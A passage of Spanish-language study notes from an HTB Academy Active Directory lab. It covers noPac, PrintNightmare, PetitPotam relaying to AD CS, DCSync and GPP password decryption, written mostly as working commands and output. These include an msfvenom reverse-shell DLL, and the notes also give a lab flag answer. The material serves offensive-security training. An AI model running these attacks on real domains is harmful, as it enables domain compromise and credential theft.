[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

Al ejecutar el exploit con `noPac.py`, se abre una **shell seminteractiva** mediante `smbexec.py`, por lo que es necesario usar rutas completas (no funciona `cd`). Además, el **TGT se guarda** localmente en el directorio desde el que se lanza el ataque. Podemos usar `ls` para verlo y reutilizarlo.

##### Confirmando la localización de los tickets guardados

```shell-session
amr251@htb[/htb]$ ls

administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py
```

El archivo `.ccache` generado puede usarse para un **Pass-The-Ticket** y realizar ataques como **DCSync**.  
Además, con la opción `-dump`, `noPac.py` permite ejecutar directamente un **DCSync** con `secretsdump.py`.  
Este proceso también genera un archivo `.ccache`, que conviene **eliminar tras el uso** por motivos de OPSEC.

##### Usando NoPac para hacer DCSync sobre la cuenta de administrador

```shell-session
amr251@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

...SNIP...

inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
```

### Consideraciones sobre Windows Defender y SMBEXEC.py

Si el objetivo tiene **Windows Defender** u otro AV/EDR activo, la shell puede establecerse, pero los comandos probablemente fallarán. Esto se debe a que `smbexec.py` crea servicios temporales (`BTOBTO`, `BTOBO`) y ejecuta comandos mediante scripts `.bat` enviados por SMB. Cada comando genera un nuevo script temporal que se ejecuta y luego se elimina, lo que puede ser detectado como actividad maliciosa por soluciones de seguridad.

Si la **OPSEC** es una prioridad, es mejor **evitar herramientas como `smbexec.py`**, ya que generan mucho ruido. Este módulo se centra en técnicas y tácticas; la metodología se irá puliendo en módulos más avanzados, pero es clave empezar con una buena base en **enumeración y ataque en AD**.

### PrintNightmare

**PrintNightmare** es el nombre de dos vulnerabilidades del servicio **Print Spooler** (CVE-2021-34527 y CVE-2021-1675) que afectan a todos los sistemas Windows. Permiten escalada de privilegios y ejecución remota. Aunque se cubren como LPE en otro módulo, también son útiles en entornos AD para obtener acceso remoto. Aquí se usará el exploit de **cube0x0** para lograr una shell SYSTEM en un DC con Windows Server 2019. El exploit debe clonarse primero con Git en el host atacante.

```shell-session
$ git clone https://github.com/cube0x0/CVE-2021-1675.git
```

Para que este exploit funcione correctamente, tendremos que usar la versión de Impacket de `cube0x0`. Puede que necesitemos desinstalar nuestra versión de Impacket e instalar la mencionada. Podemos usar `rpcdump.py` para comprobar si el objetivo expone los protocolos **Print System Asynchronous** y **Print System Remote**, lo cual indicaría que es vulnerable a PrintNightmare.

##### Enumerando MS-RPRN

```shell-session
$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
```

Después de confirmar esto, podemos intentar realizar el exploit. Podemos empezar montando un DLL usando `msfvenom`:

```shell
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

Creamos ahora un share SMB con `impacket-smbserver` en nuestra máquina de atacante para subirlo. Como siempre, por un lado montamos el handler para la reverse shell con Metasploit (`exploit/multi/handler`) .

```shell-session
$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

Finalmente ejecutamos el exploit:

```shell-session
$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...
```

Al final del comando del exploit se especifica la ruta UNC al recurso compartido donde está alojado el payload (`\\<IP_del_atacante>\Share\payload.dll`). Si el ataque tiene éxito, el objetivo accede al recurso compartido, ejecuta la DLL, y esta se conecta de vuelta al _multi-handler_, dándonos una **shell como SYSTEM**.

### PetitPotam (MS-EFSRPC)

**PetitPotam** (CVE-2021-36942) es una vulnerabilidad de _spoofing_ en LSA que permite forzar a un **Controlador de Dominio** a autenticarse contra otro host mediante **NTLM sobre el puerto 445**, abusando del protocolo **MS-EFSRPC**.

Si el entorno usa **AD CS**, el atacante puede redirigir esa autenticación al **servidor de certificados** (CA), solicitar un certificado digital, y usarlo (con herramientas como **Rubeus** o `gettgtpkinit.py`) para obtener un **TGT** válido del DC.

Esto permite ejecutar un **DCSync** y comprometer el dominio.

El ataque comienza lanzando `ntlmrelayx.py`, apuntando a la Web de inscripción de certificados del CA y usando una plantilla válida. Si no se conoce la URL del CA, se puede descubrir con herramientas como **certi**.

##### Comenzando `ntlmrelayx.py`

```shell
$ sudo impacket-ntlmrelayx -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

...SNIP...

[*] Servers started, waiting for connections
```

En otra ventana, lanzamos `PetitPotam.py` con el siguiente comando:

```bash
python3 PetitPotam.py <IP atacante> <IP del DC>
```

Esto fuerza al **DC a autenticarse** contra nuestro equipo, donde `ntlmrelayx.py` está esperando. También existen versiones para Windows:

- En **Mimikatz**:  
    `misc::efs /server:<DC> /connect:<ATACANTE>`
- En **PowerShell**:  
    `Invoke-PetitPotam.ps1`

Todas usan el método **EfsRpcOpenFileRaw** para desencadenar la autenticación NTLM.

##### Atrapando el certificado en Base64 para DC01 

De vuelta a la pantalla donde teníamos NLTM Relay, veremos una solicitud de login exitosa para obtener el certificado en Base64 para el DC si el ataque ha tenido éxito:

```shell-session
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user ACADEMY-EA-DC01$: 
MIIStQIBAzCCEn8GCSqGSIb...
[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed
```

##### Solicitando un TGT usando `gettgtpkinit.py`

Ahora, podemos coger este certificado en Base64 y usar `gettgtpkinit.py` para solicitar un TGT (_Ticket-Granting-Ticket_) para el DC.

```shell-session
amr251@htb[/htb]$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache

2022-04-05 15:56:33,239 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2022-04-05 15:56:33,362 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2022-04-05 15:56:33,395 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2022-04-05 15:56:33,396 minikerberos INFO     70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
INFO:minikerberos:70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
2022-04-05 15:56:33,401 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

El TGT solicitado anteriormente se guardó en el archivo `dc01.ccache`, el cual usamos para establecer la variable de entorno `KRB5CCNAME`, de forma que nuestro host de ataque utilice este archivo para los intentos de autenticación Kerberos.

```shell-session
$ export KRB5CCNAME=dc01.ccache
```

##### Usando el TGT del DC para acontecer DCSync

Podemos usar este TGT con `secretsdump.py` para acontecer un DCSync y obtener uno o todos los hashes NTLM para el dominio:

```shell
[!bash!]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up... 
```

Podemos usar también un comando más directo:

```bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

porque la herramienta obtendrá el nombre de usuario del archivo ccache. Podemos comprobarlo escribiendo `klist` (usar el comando `klist` requiere la instalación del paquete `krb5-user` en nuestro equipo atacante. En el laboratorio ya está instalado en `ATTACK01`).

##### Lanzando klist

```shell-session
[!bash!]$ klist

Ticket cache: FILE:dc01.ccache
Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

##### Confirmando acceso de administrador al DC

Finalmente, podríamos usar el hash NT de la cuenta integrada **Administrator** para autenticarnos en el **Controlador de Dominio**. A partir de ahí, tendríamos control completo sobre el dominio y podríamos buscar establecer persistencia, buscar datos sensibles, identificar otras malas configuraciones y vulnerabilidades para nuestro informe, o comenzar a enumerar relaciones de confianza.

```shell
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

##### Enviando una solicitud TGS para nosotros mismos usando `getnthash.py`

También podemos tomar una ruta alternativa una vez que tengamos el TGT de nuestro objetivo. Usando la herramienta `getnthash.py` de PKINITtools, podríamos solicitar el _hash_ NT del host/usuario objetivo empleando Kerberos U2U para enviar una petición TGS que incluya el Certificado de Atributos Privilegiados (PAC), el cual contiene el _hash_ NT del objetivo. Esto puede descifrarse con la clave de cifrado AS-REP que obtuvimos al solicitar el TGT anteriormente.

```shell
amr251@htb[/htb]$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
313b6f423cd1ee07e91315b4919fb4ba
```

##### Usando el Hash NTLM para acontecer DCSync

```shell
amr251@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
```

Alternativamente, una vez obtengamos el certificado en base64 mediante `ntlmrelayx.py`, podríamos usar ese certificado con la herramienta **Rubeus** desde un host atacante Windows para solicitar un ticket TGT y ejecutar un ataque **pass-the-ticket (PTT)** de una sola vez.

> *Nota*: Tendríamos que usar el host atacante **MS01** en otra sección —por ejemplo, en la de _Tácticas de abuso de ACL_ o _Acceso privilegiado_— una vez que hayamos guardado el certificado en base64 en nuestras notas para poder realizar esto con Rubeus.

##### Solicitar un TGT y realizar PTT con la cuenta de equipo **DC01$****

> *PTT significa **Pass The Ticket**

```powershell
PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

[...]
[+] Ticket successfully imported!
```

Entonces, podemos escribir `klist` para asegurarnos que el ticket se encuentra en memoria:

```powershell
PS C:\Tools> klist

Current LogonId is 0:0x4e56b

Cached Tickets: (3)
```

De nuevo: como los controladores de dominio tienen privilegios de replicación en el dominio, podemos usar el pass-the-ticket para realizar un ataque **DCSync** usando **Mimikatz** desde nuestro host atacante Windows. Aquí obtenemos el _hash_ NT de la cuenta **KRBTGT**, que podría usarse para crear un **Golden Ticket** y establecer persistencia. Podríamos obtener el _hash_ NT de cualquier usuario privilegiado mediante DCSync y avanzar a la siguiente fase de nuestra evaluación.

##### Realizando un DCSync con Mimikatz

```powershell
PS C:\Tools> cd .\mimikatz\x64\
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'inlanefreight\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
```

##### _Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop.

> **Respuesta**: D0ntSl@ckonN0P@c!

Primero, nos conectamos por SSH a la máquina de HTB. Una vez dentro, lo primero será comprobar si el sistema es vulnerable. Para ello, lanzamos el escáner ubicado en `/opt/NoPac/scanner.py` con las credenciales obtenidas previamente (`forend:Klmcargo2`) a la IP del DC (172.16.5.5)

```bash
sudo python3 /opt/noPac/scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
                                        
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
```

Hemos obtenido un ticket. Ahora intentaremos obtener una shell a nivel de SYSTEM ejecutando `noPac.py`. Esta herramienta nos permite impersonar la cuenta built-in de Administrador e iniciar una shell semi-interactiva en el DC objetivo:

```bash
sudo python3 /opt/noPac/noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap


███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
                                        
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Adding Computer Account "WIN-H2VQSPB3AMU$"
[*] MachineAccount "WIN-H2VQSPB3AMU$" password = H*NZs0IpqoN@
[*] Successfully added machine account WIN-H2VQSPB3AMU$ with password H*NZs0IpqoN@.
[*] WIN-H2VQSPB3AMU$ object = CN=WIN-H2VQSPB3AMU,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] WIN-H2VQSPB3AMU$ sAMAccountName == ACADEMY-EA-DC01
[*] Saving ticket in ACADEMY-EA-DC01.ccache
[*] Resting the machine account to WIN-H2VQSPB3AMU$
[*] Restored WIN-H2VQSPB3AMU$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] Saving ticket in administrator.ccache
[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Rename ccache with target ...
[*] Attempting to del a computer with the name: WIN-H2VQSPB3AMU$
[-] Delete computer WIN-H2VQSPB3AMU$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

Ahora que hemos ganado acceso como administrador local, simplemente buscamos la flag y terminamos. 

```powershell
C:\Windows\system32>type C:\Users\Administrator\Desktop\DailyTasks\flag.txt
D0ntSl@ckonN0P@c!
```

# Misconfiguraciones variadas

En esta sección nos moveremos entre un host atacante Windows y uno Linux mientras trabajamos los distintos ejemplos. Puedes levantar los hosts al final de esta sección e iniciar sesión por RDP en el host atacante Windows **MS01**. Para las partes que requieran interacción desde un host Linux, abre una consola de PowerShell en **MS01** y conéctate por SSH a `172.16.5.225` usando las credenciales `htb-student:HTB_@cademy_stdnt!`.

##### Pertenencia a grupos relacionados con Exchange

La instalación por defecto de Exchange suele otorgar privilegios peligrosos: el grupo **Exchange Windows Permissions** puede escribir DACLs en el objeto dominio (permitiendo, por ejemplo, DCSync) y con frecuencia contiene usuarios y equipos innecesarios; **Organization Management** es el “Domain Admins” de Exchange y puede acceder a todos los buzones y controlar el OU que contiene al anterior. Resultado: cuentas de soporte o equipos comprometidos permiten escalada masiva.

##### Viendo los permisos de los administradores de la organización

![[Pasted image 20251028080323.png|800]]

Si podemos comprometer un servidor Exchange, esto usualmente llevará a privilegios de admin de dominio. Adicionalmente, volcar credenciales en memoria de un servidor exchange producirá entre 10 y 100 credenciales en texto claro de hashes NTLM. Esto es debido a que los usuaurios tienden a iniciar sesión a _Outlook Web Access_ y Exchange cacheando sus credenciales en memoria después de un login exitoso.
##### PrivExchange

PrivExchange es un fallo en la función **PushSubscription** de Exchange que permite a cualquier usuario con buzón forzar al servidor Exchange a autenticarse contra un host controlado por el atacante. Dado que el servicio Exchange corre como **SYSTEM** y (antes del CU de 2019) tenía privilegios de **WriteDACL** sobre el dominio, esto permite relays a LDAP para extraer la base NTDS o autenticarse en otros hosts del dominio, posibilitando la obtención de privilegios de **Domain Admin** partiendo de cualquier cuenta de dominio autenticada.
##### Printer Bug

El **Printer Bug** (fallo en MS-RPRN) permite a cualquier usuario de dominio conectar con la tubería del spooler y forzar al servicio (que corre como **SYSTEM**) a autenticarse hacia un host controlado por el atacante vía SMB; con ello se puede relayar esa autenticación a LDAP para obtener **DCSync** (hashes AD) o para conceder RBCD a una cuenta de equipo bajo nuestro control, posibilitando suplantación local y compromisos cross-forest si existen trusts y delegación. El spooler viene instalado por defecto en servidores con Desktop Experience. Herramientas como _Get-SpoolStatus_ permiten detectar máquinas vulnerables.

```powershell
PS C:\htb> Import-Module .\SecurityAssessment.ps1
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
```
##### MS14-068

Fue una vulnerabilidad del protocolo Kerberos que permitía aceptar un **PAC** (Privilege Attribute Certificate) forjado como legítimo; con esto un usuario de dominio estándar podía presentarse como miembro de **Domain Admins** u otros grupos privilegiados. Se explotaba creando un PAC falso (herramientas: PyKEK, Impacket, etc.) y la única defensa efectiva fue aplicar el parche correspondiente. En HTB, la máquina **Mantis** ilustra práctica y didácticamente este fallo.
##### Husmeando credenciales LDAP

Muchas aplicaciones e impresoras guardan credenciales LDAP en su consola web —a menudo con contraseñas débiles o por defecto— y en algunos casos pueden verse en texto claro. Si tienen una función de "test connection" se puede abusar cambiando la IP LDAP por la del atacante y escuchando en el puerto 389 (por ejemplo con netcat) para capturar las credenciales cuando el dispositivo las envíe; esas cuentas suelen tener privilegios y pueden dar un punto de entrada al dominio. En otros escenarios hace falta montar un servidor LDAP completo para replicar la interacción y extraer las credenciales. Podemos ver más información en este [post](https://grimhacker.com/2018/03/09/just-a-printer/)
##### Enumerando registros DNS

Con una cuenta de usuario de dominio válida podemos usar **adidnsdump** para extraer todos los registros DNS de la zona AD —muy útil cuando los nombres de equipo son poco descriptivos— porque por defecto cualquier usuario puede listar los hijos de una zona DNS y las consultas LDAP no devuelven todos los registros. Esto permite descubrir entradas interesantes (p. ej. `JENKINS.INLANEFREIGHT.LOCAL`) que orientan el ataque. En la primera ejecución pueden aparecer registros en blanco o con formatos raros (por ejemplo `?,LOGISTICS,?`). Veamos diferentes formas de realizar esto:

**Usando adidnsdump**

```shell
amr251@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 

Password: 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

**Viendo los contenidos del archivo records.csv**

```shell-session
amr251@htb[/htb]$ head records.csv 

type,name,value
?,LOGISTICS,?
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29
```

Si lanzamos de nuevo con la flag `-r` la herramienta intentará resolver registros desconocidos haciendo uso de una consulta al registro `A`. Ahora podemos ver que la dirección IP de `172.16.5.240` mostró LOGISTICS. Esto es un pequeño ejemplo, pero merece la pena usar esta herramienta en entornos más grandes. Puede que descubramos registros ocultos que pueden llevarnos a descubrir hosts interesantes

```shell
amr251@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r

Password: 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

Luego volveríamos a mostrar el contenido del `.csv` obtenido. 
##### Otras misconfiguraciones

Información sensible como contraseñas a veces se encuentran en los campos de `descripción` o `notas` y pueden ser rápidamente enumeradas usando PowerView. Para dominios más grandes, es útil exportar esta información a un archivo CSV para su lectura offline.

```powershell
PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```

### Campo PASSWD_NOTREQD

Algunos usuarios de dominio pueden tener el flag **passwd_notreqd** en `userAccountControl`, lo que indica que no se aplica la política de longitud de contraseña y podría permitir contraseñas muy cortas o incluso en blanco (si el dominio lo permite). Esto puede ser intencional (comodidad administrativa), accidental (error al cambiar la contraseña) o un remanente de una instalación de un producto de un proveedor. No implica necesariamente que la cuenta esté sin contraseña, pero sí merece enumerarse y probarse: he visto casos explotables en auditorías. Si buscas exhaustividad, inclúyelo en el informe del cliente.

```powershell-
PS C:\HTB> Import-Module ActiveDirectory
PS C:\HTB> Get-ADUser -Filter * -Properties userAccountControl | Where-Object { ($_.userAccountControl -band 0x20) } | Select-Object SamAccountName, userAccountControl

SamAccountName userAccountControl
-------------- ------------------
Invitado                    66082
```

### Credenciales en SMB Shares y scripts SYSVOL

El recurso **SYSVOL** suele ser muy valioso: es legible por cualquier usuario autenticado y a menudo contiene scripts (batch, VBScript, PowerShell) donde puede haber contraseñas —a veces antiguas e inútiles, otras veces credenciales todavía válidas—, así que merece inspeccionarse siempre (p. ej. `reset_local_admin_pass.vbs`).

```powershell-session
Mode                LastWriteTime         Length Name                                                                 
----                -------------         ------ ----                                                                 
-a----       11/18/2021  10:44 AM            174 daily-runs.zip                                                       
-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1                                                    
-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm                                                     
-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs 
```

El script contiene la contraseña del administrador local; hay que comprobar si sigue activa en hosts del dominio (por ejemplo con CrackMapExec y `--local-auth`).

**Buscando una contraseña dentro del script**

```powershell-session
PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs

On Error Resume Next
strComputer = "."
 
Set oShell = CreateObject("WScript.Shell") 
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"
 
Set Arg = WScript.Arguments
If  Arg.Count > 0 Then
sPwd = Arg(0) 'Pass the password as parameter to the script
End if
 
'Get the administrator name
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
```

##### GPP Passwords

Cuando se crea un GPP, se crea un archivo XML en el share SYSVOL, que está cacheado localmente en endpoints para los que aplica la política de grupo. Estos archivos pueden incluir aquellos usados para:
- drives.xml
- Crear usuarios locales
- Crear archivos de configuración de impresora (_printers.xml_)
- Crear y actualizar servicios (_services.xml_)
- Crear tareas programadas (_scheduledtasks.xml_)
- Cambiar contraseñas de administradores locales

Los archivos **Groups.xml** en **SYSVOL** pueden contener contraseñas cifradas con AES-256, pero Microsoft publicó la clave para descifrarlas, y cualquier usuario autenticado puede leerlos. Aunque se parchó en 2014 (MS14-025) para impedir guardar contraseñas en GPP, los archivos antiguos permanecen accesibles y siguen siendo una fuente de credenciales.

![[Pasted image 20251114115937.png]]

Podemos utilizar `gpp-decrypt` para descifrar la contraseña que aparece en dicho XML:

```shell-session
amr251@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

Password1
```

Las contraseñas de **GPP** pueden extraerse desde **SYSVOL** manualmente o con herramientas como `Get-GPPPassword.ps1`, módulos de Metasploit o **CrackMapExec**. A veces pertenecen a cuentas antiguas o bloqueadas, pero vale la pena probarlas en ataques de _password spraying_, ya que la reutilización de contraseñas es común y puede dar acceso adicional.

```shell-session
amr251@htb[/htb]$ crackmapexec smb -L | grep gpp

[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
```

Cuando el **autologon** se configura por directiva de grupo, las credenciales quedan en **Registry.xml** dentro de **SYSVOL**, legibles por cualquier usuario de dominio. Microsoft no lo ha bloqueado, por lo que pueden extraerse con **CrackMapExec (gpp_autologin)** o **Get-GPPAutologon.ps1**.

```shell-session
amr251@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
```

##### ASREPRoasting

Si una cuenta tiene desactivada la **preautenticación Kerberos**, cualquier usuario del dominio puede solicitar su **TGT** cifrado con la contraseña de esa cuenta y luego crackearlo offline con **Hashcat** o **John the Ripper**. Es común en cuentas de servicio mal configuradas por proveedores.

```powershell-session
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

También podemos hacer esto utilizando la herramienta `Rubeus`:

```powershell-session
